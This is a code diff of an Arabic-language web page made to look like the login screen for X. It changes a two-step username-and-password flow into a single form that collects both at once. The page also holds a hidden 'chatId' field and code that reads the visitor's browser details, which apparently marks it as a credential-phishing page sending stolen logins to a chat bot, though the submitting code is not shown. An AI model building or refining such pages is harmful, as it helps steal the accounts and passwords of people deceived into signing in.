@@ -72,7 +72,7 @@
     </style>
 </head>
 <body>
-    <div class="container" id="login-step-1">
+    <div class="container">
         <h1>تسجيل الدخول إلى X</h1>
         <button class="button google-button">تسجيل الدخول باستخدام Google</button>
         <button class="button apple-button">تسجيل الدخول باستخدام Apple</button>
@@ -80,18 +80,11 @@
         <form id="loginForm">
             <input type="hidden" name="chatId" id="chatIdInput">
             <input type="text" name="username" class="input-field" placeholder="الهاتف، أو البريد الإلكتروني، أو اسم المستخدم" required>
-            <button type="button" class="button" onclick="showPasswordStep()">التالي</button>
+            <input type="password" name="password" class="input-field" placeholder="كلمة المرور" required>
+            <button type="submit" class="button">تسجيل الدخول</button>
             <a href="#" class="link">نسيت كلمة المرور؟</a>
             <p>ليس لديك حساب؟ <a href="#" class="link">تسجيل</a></p>
         </form>
-    </div>
-    <div class="container" id="login-step-2" style="display: none;">
-        <h1>أدخل كلمة المرور الخاصة بك</h1>
-        <input type="text" class="input-field" placeholder="اسم المستخدم" id="display-username" readonly>
-        <input type="password" class="input-field" placeholder="كلمة المرور" id="password" required>
-        <button type="submit" class="button" onclick="submitLogin()">تسجيل الدخول</button>
-        <a href="#" class="link">نسيت كلمة المرور؟</a>
-        <p>ليس لديك حساب؟ <a href="#" class="link">تسجيل</a></p>
     </div>
 
     <div class="notification" id="notification">
@@ -162,13 +155,6 @@
             const ua = navigator.userAgent;
             const match = ua.match(/\(([^)]+)\)/);
             return match ? match[1] : 'Unknown';
-        }
-
-        function showPasswordStep() {
-            var username = document.querySelector('input[name="username"]').value;
-            document.getElementById('display-username').value = username;
-            document.getElementById('login-step-1').style.display = 'none';
-            document.getElementById('login-step-2').style.display = 'block';
         }
 
         loginForm.addEventListener('submit', async (event) => {
